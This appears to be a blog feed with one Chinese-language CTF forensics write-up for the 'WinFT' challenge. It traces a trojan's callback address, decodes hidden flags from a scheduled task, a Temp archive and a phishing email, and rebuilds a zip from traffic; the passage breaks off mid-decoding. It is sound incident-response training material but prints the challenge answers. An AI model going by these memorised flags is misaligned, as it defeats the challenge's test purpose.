<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog</id>
    <title>Target Machines WriteUp Blog</title>
    <updated>2024-12-18T00:00:00.000Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog"/>
    <subtitle>Target Machines WriteUp Blog</subtitle>
    <icon>https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/img/favicon.ico</icon>
    <entry>
        <title type="html"><![CDATA[2024 长城杯 & 国赛 初赛 威胁检测与网络流量分析 WinFT]]></title>
        <id>https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024CCB&amp;CISCN-WinFT</id>
        <link href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024CCB&amp;CISCN-WinFT"/>
        <updated>2024-12-18T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[2024 长城杯 & 国赛 初赛 威胁检测与网络流量分析 WinFT]]></summary>
        <content type="html"><![CDATA[<p>2024 长城杯 &amp; 国赛 初赛 威胁检测与网络流量分析 WinFT</p>
<p>官方 writeup 未公布，无标准答案</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>信息</div><div class="admonitionContent_BuS1"><p>某单位网管日常巡检中发现某员工电脑（IP：192.168.116.123）存在异常外连及数据传输行为，随后立即对该电脑进行断网处理，并启动网络安全应急预案进行排查。</p></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="1">1<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024CCB&amp;CISCN-WinFT#1" class="hash-link" aria-label="1的直接链接" title="1的直接链接">​</a></h2>
<blockquote>
<p>受控机木马的回连域名及 ip 及端口是（示例：<code>flag{xxx.com:127.0.0.1:2333}</code>）</p>
</blockquote>
<p>加载虚拟机之后，在虚拟机内发现已有以下工具</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">CurrPorts</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WinHex v17.5</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SearchMyFiles</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Everything</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ProcessExplorer</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PCHunter_free</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CyberChef_v10.19.4</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>使用 <code>CurrPorts</code> 工具进行排查</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241226-192606-b088f97333b31a0b2542110f5db583b0.png" width="1063" height="758" class="img_ev3q"></p>
<p>可以发现，进程 <code>flvupdate.exe</code> 显得非常可疑，查看其网络行为</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241227-192729-a5063da45265b729ea81a1542167abbc.png" width="526" height="660" class="img_ev3q"></p>
<p>同时使用云沙箱对样本进行评估</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241230-193051-fc4c77798fc7c564ec53f3eed43bd7c6.png" width="2560" height="1371" class="img_ev3q"></p>
<p>即可确定这个进程为木马进程</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">flag{miscsecure.com:192.168.116.130:443}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="2">2<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024CCB&amp;CISCN-WinFT#2" class="hash-link" aria-label="2的直接链接" title="2的直接链接">​</a></h2>
<blockquote>
<p>受控机启动项中隐藏 flag 是</p>
</blockquote>
<p>对靶机的任务计划进行排查，快捷键 <code>Win</code>+<code>R</code> 输入 <code>taskschd.msc</code> 启动任务计划程序</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241233-193352-f4f7a9913ab7ed29d7454a20a4e76956.png" width="1337" height="914" class="img_ev3q"></p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">f^l^a^g^:JiM3ODsmIzEwNTsmIzk5OyYjMTAxOyYjNjUyOTI7JiMxMDI7JiMxMDg7JiM5NzsmIzEwMzsmIzMyOyYjMTA1OyYjMTE1OyYjMzI7JiMxMjM7JiM2NTsmIzY5OyYjODM7JiM5NTsmIzEwMTsmIzExMDsmIzk5OyYjMTE0OyYjMTIxOyYjMTEyOyYjMTE2OyYjMTA1OyYjMTExOyYjMTEwOyYjOTU7JiM5NzsmIzEwODsmIzEwMzsmIzExMTsmIzExNDsmIzEwNTsmIzExNjsmIzEwNDsmIzEwOTsmIzk1OyYjMTA1OyYjMTE1OyYjOTU7JiM5NzsmIzExMDsmIzk1OyYjMTAxOyYjMTIwOyYjOTk7JiMxMDE7JiMxMDg7JiMxMDg7JiMxMDE7JiMxMTA7JiMxMTY7JiM5NTsmIzEwMTsmIzExMDsmIzk5OyYjMTE0OyYjMTIxOyYjMTEyOyYjMTE2OyYjMTA1OyYjMTExOyYjMTEwOyYjOTU7JiM5NzsmIzEwODsmIzEwMzsmIzExMTsmIzExNDsmIzEwNTsmIzExNjsmIzEwNDsmIzEwOTsmIzEyNTs=</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>对此任务计划的描述进行解码</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241236-193610-20c30612482d217d845dd0ebbe4822fc.png" width="2089" height="1270" class="img_ev3q"></p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Nice，flag is {AES_encryption_algorithm_is_an_excellent_encryption_algorithm}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>即可得到答案</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">flag{{AES_encryption_algorithm_is_an_excellent_encryption_algorithm}}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="3">3<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024CCB&amp;CISCN-WinFT#3" class="hash-link" aria-label="3的直接链接" title="3的直接链接">​</a></h2>
<blockquote>
<p>受控机中驻留的 flag 是</p>
</blockquote>
<p>对靶机的环境进行排查，在用户的临时目录下发现特殊文件</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:/Users/zx/AppData/Local/Temp/F^L^A^G^</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>本文件的特征符合 7z 压缩文件，但是其有密码保护</p>
<p>经过多次尝试，确认密码为恶意进程的进程名，也就是 <code>flvupdate</code></p>
<p>解压之后，得到文件 <code>info.txt</code> 之后，即可得到答案</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">flag{Timeline_correlation_is_a_very_important_part_of_the_digital_forensics_process}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="4">4<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024CCB&amp;CISCN-WinFT#4" class="hash-link" aria-label="4的直接链接" title="4的直接链接">​</a></h2>
<blockquote>
<p>受控源头隐藏的 flag 是</p>
</blockquote>
<p>在靶机的环境中，<code>Thunderbird</code> 的快捷方式很突出，对邮件列表进行排查，重点观察带附件的邮件，发现</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241200-010009-4a2566e656ec13a1049e30b7c5f28ce5.png" width="2259" height="1372" class="img_ev3q"></p>
<p>查看此发件人的来往邮件</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241202-010226-be1f7ee9eaa74bf66ae107495a4eef8b.png" width="2258" height="1372" class="img_ev3q"></p>
<p>对邮件源码进行分析</p>
<div class="language-eml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-eml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">From - Thu Nov 21 14:03:18 2024</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">X-Mozilla-Status: 0001</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">X-Mozilla-Status2: 00000000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">From: "safe@service.autorevertech.cn" &lt;safe@service.autorevertech.cn&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">To: "Michael@pwnsecure.cn" &lt;Michael@pwnsecure.cn&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Subject: Hi, welcome to attend</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Mime-Version: 1.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Content-Type: multipart/alternative;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    boundary="----=_NextPart_673DC3E1_153C7D50_33CF5209"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Content-Transfer-Encoding: 8Bit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Date: Wed, 19 Nov 2024 22:23:45</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">X-Priority: 3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">This is a multi-part message in MIME format.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">------=_NextPart_673DC3E1_153C7D50_33CF5209</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Content-Type: text/plain;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    charset="gb18030"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Content-Transfer-Encoding: base64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SGVsbG8sIHRoaXMgaXMgdGhlIGFjY2VzcyBsaW5rLCBwbGVhc2UgY2xpY2sgYW5kIGdldC4g</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">VGhhbmsgeW91IHZlcnkgbXVjaCE=</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">------=_NextPart_673DC3E1_153C7D50_33CF5209</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Content-Type: text/html;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    charset="gb18030"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Content-Transfer-Encoding: base64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SGVsbG8sIHRoaXMgaXMgdGhlIGFjY2VzcyBsaW5rLCA8YSBocmVmPSJodHRwczovL2F1dG9y</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ZXZlcnRlY2guY29tP2tleT0lNjElNDclNkUlNzYlNzYlNDklNzglNkQlNjIlNDclNDYlNkUl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NDklNDclNkMlN0ElNDklNDglNzQlNTUlNjElNDclNTUlNjclNTMlNkQlMzklMzElNjMlNkQl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MzUlNkMlNjUlNTMlNDIlMzAlNjIlNzklNDIlMzAlNjElNDclNTUlNjclNTYlMzIlNTYlN0El</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NjQlNDglMzAlM0QiPnBsZWFzZSBjbGljayBhbmQgZ2V0PC9hPi4gVGhhbmsgeW91IHZlcnkg</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bXVjaCE=</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">------=_NextPart_673DC3E1_153C7D50_33CF5209--</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>对其中的链接进行分析</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">SGVsbG8sIHRoaXMgaXMgdGhlIGFjY2VzcyBsaW5rLCA8YSBocmVmPSJodHRwczovL2F1dG9y</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ZXZlcnRlY2guY29tP2tleT0lNjElNDclNkUlNzYlNzYlNDklNzglNkQlNjIlNDclNDYlNkUl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NDklNDclNkMlN0ElNDklNDglNzQlNTUlNjElNDclNTUlNjclNTMlNkQlMzklMzElNjMlNkQl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MzUlNkMlNjUlNTMlNDIlMzAlNjIlNzklNDIlMzAlNjElNDclNTUlNjclNTYlMzIlNTYlN0El</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NjQlNDglMzAlM0QiPnBsZWFzZSBjbGljayBhbmQgZ2V0PC9hPi4gVGhhbmsgeW91IHZlcnkg</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bXVjaCE=</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hello, this is the access link, &lt;a href="https://autorevertech.com?key=%61%47%6E%76%76%49%78%6D%62%47%46%6E%49%47%6C%7A%49%48%74%55%61%47%55%67%53%6D%39%31%63%6D%35%6C%65%53%42%30%62%79%42%30%61%47%55%67%56%32%56%7A%64%48%30%3D"&gt;please click and get&lt;/a&gt;. Thank you very much!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">key=%61%47%6E%76%76%49%78%6D%62%47%46%6E%49%47%6C%7A%49%48%74%55%61%47%55%67%53%6D%39%31%63%6D%35%6C%65%53%42%30%62%79%42%30%61%47%55%67%56%32%56%7A%64%48%30%3D</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>继续解码</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">%61%47%6E%76%76%49%78%6D%62%47%46%6E%49%47%6C%7A%49%48%74%55%61%47%55%67%53%6D%39%31%63%6D%35%6C%65%53%42%30%62%79%42%30%61%47%55%67%56%32%56%7A%64%48%30%3D</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">aGnvvIxmbGFnIGlzIHtUaGUgSm91cm5leSB0byB0aGUgV2VzdH0=</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hi，flag is {The Journey to the West}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>即可得到答案</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">flag{The Journey to the West}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="5">5<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024CCB&amp;CISCN-WinFT#5" class="hash-link" aria-label="5的直接链接" title="5的直接链接">​</a></h2>
<blockquote>
<p>分析流量，获得压缩包中得到答案</p>
</blockquote>
<p>对流量包筛选 HTTP 传输的文件流量，可以发现两个文件</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241211-011128-b56475642c98a3f796e5b28fe4f2ada6.png" width="2560" height="1540" class="img_ev3q"></p>
<p>将文件导出进行分析</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241214-011415-3b93698c589fcca357e55ee70a6e05ec.png" width="2560" height="1506" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241215-011511-de758cc859a522e41f4b88a18a1454e2.png" width="2560" height="1506" class="img_ev3q"></p>
<p>怀疑原本的 zip 文件被拆分为 <code>cilent</code>+<code>server</code> 两个文件，将其拼接起来即可得到正常的 zip 文件</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241217-011718-82d9de3a674c3d07823bed9c6f75f1d2.png" width="1540" height="947" class="img_ev3q"></p>
<p>对压缩包文件进行检查，发现存在有压缩包注释</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241217-011757-30c944e3ad5bfc13eb0c7a3dd7941476.png" width="1540" height="947" class="img_ev3q"></p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">5pe26Ze057q/5YWz6IGU6Z2e5bi46YeN6KaB</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>解码后得到</p>
